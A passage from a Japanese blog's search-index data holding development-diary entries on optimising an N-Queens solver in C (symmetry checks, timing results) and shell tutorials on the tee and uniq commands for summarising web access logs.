aBoard[],int bBoard[],long bmask){ int bit; int colsize; //nが奇数の場合は真ん中もやる if(size%2==1){ colsize=size/2+1; }else{ colsize=size/2; } for(int col=0;col\u0026lt;colsize;col++){ bBoard[0]=bit=(1\u0026lt;\u0026lt;col); int x=0; if(bit==1){ x=0; }else if(bit==2){ x=1; }else if(bit==4){ x=2; }else if(bit==8){ x=3; }else if(bit==16){ x=4; }else if(bit==32){ x=5; }else if(bit==64){ x=6; }else if(bit==128){ x=7; }else if(bit==256){ x=8; }else if(bit==512){ x=9; }else if(bit==1024){ x=10; }else if(bit==2048){ x=11; }else if(bit==4096){ x=12; }else if(bit==8192){ x=13; }else if(bit==16384){ x=14; }else if(bit==32768){ x=15; }else if(bit==65536){ x=16; }else if(bit==131072){ x=17; } aBoard[0]=x; solve_nqueenr(size,mask,1,bit\u0026lt;\u0026lt;1,bit,bit\u0026gt;\u0026gt;1,aBoard,1\u0026lt;\u0026lt;(size-1+x),bit,1\u0026lt;\u0026lt;(x),bBoard,bmask); //NQueenR(size,mask,row+1,(left|bit)\u0026lt;\u0026lt;1, (down|bit),(right|bit)\u0026gt;\u0026gt;1,aBoard,lleft|1\u0026lt;\u0026lt;(size-1-row+x),ldown|bit,lright|1\u0026lt;\u0026lt;(row+x),bBoard,bmask); } } ミラー適用後 ６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.01 11: 2680 341 0.02 12: 14200 1788 0.06 13: 73712 9237 0.20 14: 365596 45771 0.63 15: 2279184 285095 2.52 16: 14772512 1847425 11.85 17: 95815104 11979381 1:10.41 ミラー適用前 ６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.01 11: 2680 341 0.03 12: 14200 1788 0.11 13: 73712 9237 0.32 14: 365596 45771 1.00 15: 2279184 285095 3.37 16: 14772512 1847425 15.38 17: 95815104 11979381 1:19.15 ","date":"2022-08-29T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-29-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-29-01-ani/","title":"NQueen日記 2022/08/29"},{"content":"8月18日 調べたところ、2辺が同じ場合は3辺目を比較する処理をコメントしていた\nコメントを外して実行したところ旧ロジックと同じ結果になった。\n旧ロジックに比べてまだ20%くらい遅い。\n今後以下をチューニングしていきたい。\n・ミラー処理を入れる（１行目右半分だけ実行する）\n・枝刈りを入れる（BOUND1,BOUND2）\n・symmetryの判定を05C/GCC12と同じにする\n・symmetryOpsの比較をビット計算に差し替える\n新ロジック実行結果\n６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.01 11: 2680 341 0.03 12: 14200 1788 0.11 13: 73712 9237 0.32 14: 365596 45771 1.00 15: 2279184 285095 3.37 16: 14772512 1847425 15.38 17: 95815104 11979381 1:19.15 旧ロジック実行結果\n７．CPUR 再帰 バックトラック＋ビットマップ＋対称解除法 N: Total Unique hh:mm:ss.ms 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.00 11: 2680 341 0.01 12: 14200 1788 0.03 13: 73712 9237 0.10 14: 365596 45771 0.34 15: 2279184 285095 1.53 16: 14772512 1847425 8.80 17: 95815104 11979381 55.56 ","date":"2022-08-18T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-18-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-18-01-ani/","title":"NQueen日記 2022/08/18"},{"content":"8月17日 新旧ロジックでn2,n4,n8判定の差分をロギングして比較してみた。\n以下が新ロジックだとn4だったが、旧ロジックだとn8だった\nt0:3,t1:5,l0:4,l1:2,b0:3,b1:5,r0:4,r1:6 t0:2,t1:6,l0:6,l1:2,b0:2,b1:6,r0:6,r1:4 t0:2,t1:6,l0:5,l1:2,b0:2,b1:6,r0:6,r1:2 t0:2,t1:6,l0:3,l1:7,b0:2,b1:6,r0:5,r1:7 t0:2,t1:6,l0:3,l1:5,b0:2,b1:6,r0:5,r1:7 t0:2,t1:6,l0:3,l1:5,b0:2,b1:6,r0:5,r1:2 t0:2,t1:6,l0:3,l1:5,b0:2,b1:6,r0:3,r1:7 t0:2,t1:5,l0:4,l1:7,b0:2,b1:5,r0:6,r1:3 t0:2,t1:5,l0:4,l1:2,b0:2,b1:5,r0:6,r1:3 t0:2,t1:5,l0:4,l1:2,b0:2,b1:5,r0:6,r1:2 t0:2,t1:5,l0:2,l1:7,b0:2,b1:5,r0:6,r1:3 t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:6,r1:3 t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:6,r1:2 t0:2,t1:4,l0:5,l1:3,b0:2,b1:4,r0:5,r1:7 t0:2,t1:4,l0:5,l1:2,b0:2,b1:4,r0:5,r1:3 t0:2,t1:4,l0:3,l1:7,b0:2,b1:4,r0:5,r1:7 t0:2,t1:4,l0:3,l1:7,b0:2,b1:4,r0:5,r1:3 t0:2,t1:4,l0:2,l1:7,b0:2,b1:4,r0:5,r1:3 t0:1,t1:7,l0:6,l1:9,b0:1,b1:7,r0:7,r1:9 t0:1,t1:7,l0:5,l1:9,b0:1,b1:7,r0:7,r1:9 t0:1,t1:7,l0:5,l1:9,b0:1,b1:7,r0:6,r1:9 t0:1,t1:7,l0:4,l1:9,b0:1,b1:7,r0:7,r1:9 t0:1,t1:7,l0:4,l1:9,b0:1,b1:7,r0:6,r1:9 t0:1,t1:7,l0:2,l1:9,b0:1,b1:7,r0:6,r1:9 t0:1,t1:7,l0:2,l1:9,b0:1,b1:7,r0:5,r1:9 t0:1,t1:7,l0:2,l1:9,b0:1,b1:7,r0:4,r1:9 t0:1,t1:6,l0:6,l1:9,b0:1,b1:6,r0:7,r1:9 t0:1,t1:6,l0:5,l1:9,b0:1,b1:6,r0:7,r1:9 t0:1,t1:6,l0:5,l1:9,b0:1,b1:6,r0:6,r1:9 t0:1,t1:6,l0:3,l1:9,b0:1,b1:6,r0:7,r1:9 t0:1,t1:6,l0:3,l1:9,b0:1,b1:6,r0:5,r1:9 t0:1,t1:5,l0:6,l1:9,b0:1,b1:5,r0:7,r1:9 t0:1,t1:5,l0:4,l1:9,b0:1,b1:5,r0:7,r1:9 t0:1,t1:5,l0:4,l1:9,b0:1,b1:5,r0:6,r1:9 t0:1,t1:5,l0:2,l1:9,b0:1,b1:5,r0:6,r1:9 t0:1,t1:5,l0:2,l1:9,b0:1,b1:5,r0:4,r1:9 t0:1,t1:4,l0:5,l1:9,b0:1,b1:4,r0:7,r1:9 t0:1,t1:4,l0:3,l1:9,b0:1,b1:4,r0:7,r1:9 t0:1,t1:4,l0:3,l1:9,b0:1,b1:4,r0:5,r1:9 t0:1,t1:4,l0:2,l1:9,b0:1,b1:4,r0:5,r1:9 t0:1,t1:4,l0:2,l1:9,b0:1,b1:4,r0:3,r1:9 t0:1,t1:3,l0:4,l1:9,b0:1,b1:3,r0:6,r1:9 t0:1,t1:3,l0:3,l1:9,b0:1,b1:3,r0:4,r1:9 t0:1,t1:3,l0:2,l1:9,b0:1,b1:3,r0:6,r1:9 t0:1,t1:3,l0:2,l1:9,b0:1,b1:3,r0:4,r1:9 t0:1,t1:3,l0:2,l1:9,b0:1,b1:3,r0:3,r1:9 新ロジックだとtopとbottomが同じものをn4としていた。\n例えば以下の例だと\nt0:3,t1:5,l0:4,l1:2,b0:3,b1:5,r0:4,r1:6\ntopはt0:3,t1:5、bottomはb0:3,b1:5で1同じである。\nでも180度回転させて同じになるにはleftとrightも同じでなくてはならないのを忘れてた。\n例えばこんな感じのがn4になる\nt0:3,t1:5,l0:4,l1:6,b0:3,b1:5,r0:4,r1:6\nn4の判定にleft==rightも追加することにする。\n}else if(bottomSide_0==topSide_0 \u0026amp;\u0026amp; bottomSide_1==topSide_1){ printf(\u0026#34;sym:1:t0:%d,t1:%d,l0:%d,l1:%d,b0:%d,b1:%d,r0:%d,r1:%d\\n\u0026#34;,topSide_0,topSide_1,leftSide_0,leftSide_1,bottomSide_0,bottomSide_1,rightSide_0,rightSide_1); if(leftSide_0==rightSide_0\u0026amp;\u0026amp;leftSide_1==rightSide_1){ return 1; } return 2; }else{ 追加した結果n11まで数が合うようになった。\n６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.01 11: 2680 341 0.03 12: 14232 1792 0.11 13: 73792 9247 0.33 14: 365708 45785 1.06 15: 2279648 285153 3.49 n12から違うので調査したいと思う\n","date":"2022-08-17T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-17-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-17-01-ani/","title":"NQueen日記 2022/08/17"},{"content":"8月12日 この前と同じようにn10について新旧ロジックを比較して見た。\n新ロジックだけのルートは以下の2つだけだった。\nどちらも正解にはならなかった。\nt0:2,t1:5,l0:2,l1:5,b0:6,b1:3,r0:2,r1:5 9 8 7 6 5 4 3 2 1 0 ================================= 0| 0000000100 1| 0000100000 2| 1000000000 3| 0000000000 4| 0000000010 5| 0100000000 6| 0000000000 7| 0000000001 8| 0010000000 9| 0000001000 t0:2,t1:5,l0:2,l1:5,b0:6,b1:2,r0:2,r1:5 9 8 7 6 5 4 3 2 1 0 ================================= 0| 0000000100 1| 0000100000 2| 1000000000 3| 0000000001 4| 0000000000 5| 0000000000 6| 0000000000 7| 0000000000 8| 0000000010 9| 0000001000 n10については新旧UNIQUE数は同じでTOTAL数だけ違う\n旧ロジック　10: 724 92 0.01\n新ロジック　10: 720 92 0.01\n2,4,8 の振り分けも間違っているのかもしれない。\n2,4,8それぞれどこに何個振り分けられるかもロギングして比較する必要がありそう\n","date":"2022-08-12T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-12-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-12-01-ani/","title":"NQueen日記 2022/08/12"},{"content":"8月10日 比較して同じだった場合は反時計回りに90度回転させたもの同士を比較するようにしてみた。\n例えば 上2行と右2列が同じだった場合はそれぞれを反時計回りに90度回転させた左2列と上2行を比較してみた。\n//top == right left \u0026gt; top if((topSide_0==rightSide_0)\u0026amp;\u0026amp;(topSide_1==rightSide_1)){ if((leftSide_0\u0026gt;topSide_0)||((leftSide_0==topSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;topSide_1))){ return 3; } } //top == bottom left \u0026gt; right if((topSide_0==bottomSide_0)\u0026amp;\u0026amp;(topSide_1==bottomSide_1)){ if((leftSide_0\u0026gt;rightSide_0)||((leftSide_0==rightSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;rightSide_1))){ return 3; } } //top == left left \u0026gt; bottom if((topSide_0==leftSide_0)\u0026amp;\u0026amp;(topSide_1==leftSide_1)){ if((leftSide_0\u0026gt;bottomSide_0)||((leftSide_0==bottomSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;bottomSide_1))){ return 3; } } //top == mtop left \u0026gt; mleft if((topSide_0==mtopSide_0)\u0026amp;\u0026amp;(topSide_1==mtopSide_1)){ if((leftSide_0\u0026gt;mleftSide_0)||((leftSide_0==mleftSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;mleftSide_1))){ return 3; } } //top == mright left \u0026gt; mtop if((topSide_0==mrightSide_0)\u0026amp;\u0026amp;(topSide_1==mrightSide_1)){ if((leftSide_0\u0026gt;mtopSide_0)||((leftSide_0==mtopSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;mtopSide_1))){ return 3; } } //top == mbottom left \u0026gt; mright if((topSide_0==mbottomSide_0)\u0026amp;\u0026amp;(topSide_1==mbottomSide_1)){ if((leftSide_0\u0026gt;mrightSide_0)||((leftSide_0==mrightSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;mrightSide_1))){ return 3; } } //top == mleft left \u0026gt; mbottom if((topSide_0==mleftSide_0)\u0026amp;\u0026amp;(topSide_1==mleftSide_1)){ if((leftSide_0\u0026gt;mbottomSide_0)||((leftSide_0==mbottomSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;mbottomSide_1))){ return 3; } } N8,N9は数が合うようになった。\nしかしN10以降は数がずれてる\u0026hellip;.\n６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 720 92 0.01 11: 2668 341 0.04 12: 14148 1792 0.12 13: 73516 9247 0.36 14: 364508 45785 1.09 15: 2273920 285153 3.77 ","date":"2022-08-10T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-10-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-10-01-ani/","title":"NQueen日記 2022/08/10"},{"content":"8月9日 抽出した新ロジックだけのルートの中から、クイーン数に影響のあるもの、\nsymmetryOpsのあとで、NQueenをして最終行に到達するものを探したところ\n以下の1個が最終行に到達するものだった。\nt0:2,t1:5,l0:4,l1:6,b0:4,b1:1,r0:2,r1:5 \u0026lt;\u0026gt;N=8 STEP:251-7063 row:8 bit:0 7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 00000010 3| 00000000 4| 10000000 5| 00000001 6| 01000000 7| 00001000 反時計回りに90度回転させると以下のようになる\nt0:2,t1:5,l0:2,l1:5,b0:4,b1:6,r0:4,r1:1 7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 10000000 3| 00000001 4| 00000000 5| 01000000 6| 00000010 7| 00001000 ログを見てみるとやはり存在した。\n最小値判定が甘かったみたい。\n最小値判定の見直しが必要。\n現在は、上2行t0,t1と左、下、右、ミラー上、ミラー左、ミラー下、ミラー右を判定している\nt0 2 t 5 \u0026lt; l0 4 l1 6 t0 2 t 5 \u0026lt; b0 4 b1 1 . . . これだと今回のように上2行と右2行の値が同じ時にうまくいかなくなる\nt0:2,t1:5 = r0:2,r1:5\nt0:2,t1:5,l0:4,l1:6,b0:4,b1:1,r0:2,r1:5 \u0026gt; t0:2,t1:5,l0:2,l1:5,b0:4,b1:6,r0:4,r1:1\nのように全体の比較が必要でロジックを見直す必要がある。\nまずは 25464125 \u0026gt; 25254641のように8桁の数字に直して比較しようと思う。\n将来的にはビット計算で計算を効率化したい。\n","date":"2022-08-09T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-09-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-09-01-ani/","title":"NQueen日記 2022/08/09"},{"content":"8月8日 先日抽出した、新ロジックだけsymmetryOpsを突破した組み合わせのクイーンの配置を出力してみた。\nt0:1,t1:3,l0:4,l1:7,b0:1,b1:3,r0:2,r1:7 7 6 5 4 3 2 1 0 ============================= 0| 00000010 1| 00001000 2| 00000000 3| 00000000 4| 10000000 5| 00000001 6| 00010000 7| 01000000 t0:1,t1:4,l0:5,l1:7,b0:1,b1:4,r0:3,r1:7 7 6 5 4 3 2 1 0 ============================= 0| 00000010 1| 00010000 2| 00000000 3| 00000000 4| 00000001 5| 10000000 6| 00001000 7| 01000000 t0:1,t1:5,l0:4,l1:7,b0:1,b1:5,r0:2,r1:7 7 6 5 4 3 2 1 0 ============================= 0| 00000010 1| 00100000 2| 00000000 3| 00000000 4| 10000000 5| 00000001 6| 00000100 7| 01000000 t0:1,t1:5,l0:5,l1:7,b0:1,b1:5,r0:4,r1:7 7 6 5 4 3 2 1 0 ============================= 0| 00000010 1| 00100000 2| 00000000 3| 00000001 4| 00000000 5| 10000000 6| 00000100 7| 01000000 t0:2,t1:5,l0:4,l1:6,b0:4,b1:1,r0:2,r1:5 7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 00000010 3| 00000000 4| 10000000 5| 00000001 6| 01000000 7| 00001000 ぱっと見おかしいものはないが、気になるのは最小値チェックが正しいかどうか。\n","date":"2022-08-08T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-08-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-08-01-ani/","title":"NQueen日記 2022/08/08"},{"content":"8月5日 N8でsymmetryOps直後の新旧ロジックのクイーンの配置を比較してみた。\nN8だとユニーク数の正しい数は12 新ロジックだとユニーク数が13で余分に1つ多い。\n新旧ロジックそれぞれでsymmetryOpsを突破した数は新ロジックが163なのに対し旧ロジックが179で旧ロジックの方がなぜか多い。\nとりあえず、新ロジックにあって旧ロジックにないルートを抽出してみた。\ncat q q n|sort |uniq -c|sort -n (qは旧ロジックの結果、nは新ロジックの結果。sortして数が1のものが新ロジックだけのルート） t0:1,t1:3,l0:4,l1:7,b0:1,b1:3,r0:2,r1:7 t0:1,t1:4,l0:5,l1:7,b0:1,b1:4,r0:3,r1:7 t0:1,t1:5,l0:4,l1:7,b0:1,b1:5,r0:2,r1:7 t0:1,t1:5,l0:5,l1:7,b0:1,b1:5,r0:4,r1:7 t0:2,t1:5,l0:4,l1:6,b0:4,b1:1,r0:2,r1:5 t0 上1行目 t1 上2行目 という感じでlが左 b が下 r が右にクイーンを配置した場所 それぞれのクイーンの配置を検討していきたいと思う\n","date":"2022-08-05T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-05-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-05-01-ani/","title":"NQueen日記 2022/08/05"},{"content":"いままでのNQueenは NQueenは、ひとつの解には、盤面を90度・180度・270度回転、及びそれらの鏡像の合計8個の対称解が存在します。これを利用した、対称的な解を除去し、ユニーク解のみを求める方法として解がみつかるとすべての対称解を生成し、 状態を数値とみなして最も小さいもののみを解とする方法（最小解選択法）をベースに枝刈りを追加したロジックで高速化を試みていました。\nこのロジックをGPUを利用して並列化し高速化しようとしました。\n確かにかなり速くなったのですがボトルネックが見つかりました。最小解選択法は、最終行で回転チェックをして最少解判定(symmetryOps)を行うのですが、symmetryOpsに必要な情報として各行のどこにクイーンを置いたかという配列(aBoard)が必要になります。このaBoard配列をGPUに呼び出す際に渡す必要があるのですが、それなりの情報量があり、これがかなりのボトルネックとなってました。\nそんな時に、鈴木維一郎先生が、N27を実現したプロジェクトのプログラムを見つけて来てくれました。\nhttps://github.com/preusser/q27/blob/master/pitch.pdf\nこのプログラムのロジックは、最初にsymmetryOpsに必要な上下左右2行2列にクイーンを置き、symmetryOpsをした後に残りのNQueenを実行するというものでした。\nこれなら、GPUにaBoard配列を渡さなくて済むので問題解決ではと思い取り組みました。\n進めていくと、上下左右2行2列にクイーンを置くロジックが遅すぎて今までのロジックの10倍くらい時間がかかることが分かりました。\nそこで、現在はこの上下左右2行2列にクイーンを置くロジックを速くできないか日々格闘しているところです。\n8月4日 上下左右2行2列にクイーンを置くロジックを上下左右2行2列にしかクイーンを置けないようにしながら1行目から最終行まで一旦NQueenをするというロジックを開発して数が合うまでにはなった。\nしかし、symmetryOpsを追加するとn8から数が合わなくなる。\nN: Unique hh:mm:ss.ms 4: 1 0.00 5: 2 0.00 6: 1 0.00 7: 6 0.00 8: 13 0.00 9: 47 0.00 10: 93 0.01 11: 350 0.04 12: 1855 0.12 13: 9407 0.35 14: 46496 1.08 15: 288695 3.61 1週間以上考えてもさっぱりわからないので新ロジックと既存のnq27_N-Queen.cの両方にsymmetryOpsした直後の状態をロギングするようにして違いを眺めることにした。ロギングの準備は終わったが、n5から数が合わないなら楽だがn8からだと比較するのが結構大変そうだ。\n時間がかかりそうなので日記形式で日々の取り組みを記すことにした。\n","date":"2022-08-04T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-04-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-04-01-ani/","title":"NQueen日記 2022/08/04"},{"content":"teeコマンド ファイルへのリダイレクトとパイプを同時に行う 出力するファイルは都度新規作成ではなく追記する teeコマンド概要 teeコマンドは、標準入力から受け取った出力を、標準出力へ出力しつつ、同時にファイルに書き出すコマンドです。\nteeコマンドの書式 コマンド | tee ファイル | コマンド2\nコマンド | tee ファイル1 ファイル2 ファイル3……\nteeコマンドの主なオプション オプション 意味 -a 指定したファイルが既に存在する場合、新規にファイルを作成せずにすでに存在するファイルに追加する（リダイレクトの「\u0026raquo;」に相当） teeコマンド詳細説明 ファイルへのリダイレクトとパイプを同時に行う 以下のコマンドは、画面に出力をしつつ、同じ内容を output.txtに出力しています。\n$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee output.txt 出力するファイルは都度新規作成ではなく追記する teeコマンドは指定されたファイルを新規作成して出力内容をファイルに書き出します。-a オプションを付けることによって、append（追記）することができます。\noutput.txtに出力を追記する\n# 予めファイルを生成しておく $ :\u0026gt;output.txt $ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt # 時間をおいて再度実行すると追記される $ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt ヒント teeコマンドの -aオプションは非常によく使います。 teeコマンドの出力をファイル書き出す場合、デフォルトは「\u0026gt;」と同等の処理で、-aオプションを付けることによって「\u0026raquo;」と同様に処理となります。 注意 「\u0026raquo;」も同様に tee -aの場合は、予めファイルを作成しておき、そのファイルに対して「\u0026raquo;」やtee -aを行います。追記する最初の処理段階でファイルが存在していることを明示的に書いておくことが重要です。 以下のまとめのように、追記する前に上書きする処理をしておく場合は、あらかじめファイルの生成をする必要はありませんが、明示的に「 $ :\u0026gt; filename 」のようにファイルを生成しておくと、ソースがわかりやすくなります。 まとめ\nechoだと以下のとおりです。ファイルには出力されるが、画面には処理内容が出力されないのでいまいち不便。\n# 上書き $ echo \u0026#34;文字列\u0026#34; \u0026gt; fileName # 追記 $ echo \u0026#34;文字列\u0026#34; \u0026gt;\u0026gt; fileName そこで、処理の出力内容が画面にも表示されるようteeを使う\n# 上書き $ echo \u0026#34;文字列\u0026#34; | tee fileName # 追記 $ echo \u0026#34;文字列\u0026#34; | tee -a fileName 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-28T10:24:32+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-28-01-tee-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-28-01-tee-suzuki/","title":"（２６）【tee】シェルスクリプトコマンド活用紹介"},{"content":"uniqコマンド 重複している行を削除する 大文字／小文字を区別しないで重複行を削除する 重複している行をカウントする uniqコマンド概要 uniqコマンドは、ファイル内の重複している行を扱うコマンドです。具体的には重複している行を除去して表示したり、重複回数を表示したりできます。\nヒント uniqコマンドを実行する前にsortコマンドで並べ替えておく必要があります。 uniqコマンドの書式 uniq [オプション] 入力ファイル [出力ファイル]\nuniqコマンドの主なオプション オプション 意味 -i 比較時に大文字と小文字の違いを無視する -c 各行の前に出現回数を出力する uniqコマンド詳細説明 重複している行を削除する $ uniq ファイル名 で、ファイル内の重複行を取り除くことができます。注意点はあらかじめsortコマンドで並べ替えておく必要があります。\nヒント 実は sort -u というコマンドは、並べ替えつつuniqも実行するという便利なsortコマンドのオプションもあります。一般的にはsort -uを使うことが多いのですが、明示的にuniqコマンドを使うこともあります。 以下のコマンドの出力は同じです。\n$ cat fileName.txt | sort | uniq $ cat fileName.txt | sort -u 大文字／小文字を区別しないで重複行を削除する 「-i」（\u0026ndash;ignore-case）オプションを使うと、大文字／小文字を区別しないで重複する行を削除することができます。\nヒント uniqコマンドのignore-caseは-iです。同時に予め実行しておくsortコマンドもignore-caseも行う必要がありますが、こちらのオプションは -f です。紛らわしいですね。 ヒント 各コマンドのignore-case(大文字小文字を区別しない)は、以下のとおりです。 sort -f uniq -i grep -i 実行結果は以下のとおりです。\n$ cat fileName.txt | sort -f | uniq -i 重複している行をカウントする sortとuniqコマンドの組み合わせで、最も使われるオプションは-cでしょう。「-c」オプションは、重複している行をカウントします。\nアクセスログを並べ替えて表示\ncat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 最初のcatでApacheのaccess.logを出力します。\n次のsortで出力を並べ替えます。\nそしてuniq -cで、重複行の数をカウントし、行頭に頻度数を付与します。\nさらに、行頭の頻度数を数値として扱いsort -nで並べ替えます。\n最後のhead -n15コマンドで、頻度の高いアクセスを出力します。\nヒント CSSなどのファイルを除外する場合は以下のコマンドを使うと良いでしょう。 cat /var/log/httpd/access.log | grep -ive \u0026#34;GET /.*\\.\\(css\\|js\\|jpg\\|gif\\|png\\|swf\\|ico\\)\\ HTTP\u0026#34; | sort | uniq -c | sort -n | head -n15 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! 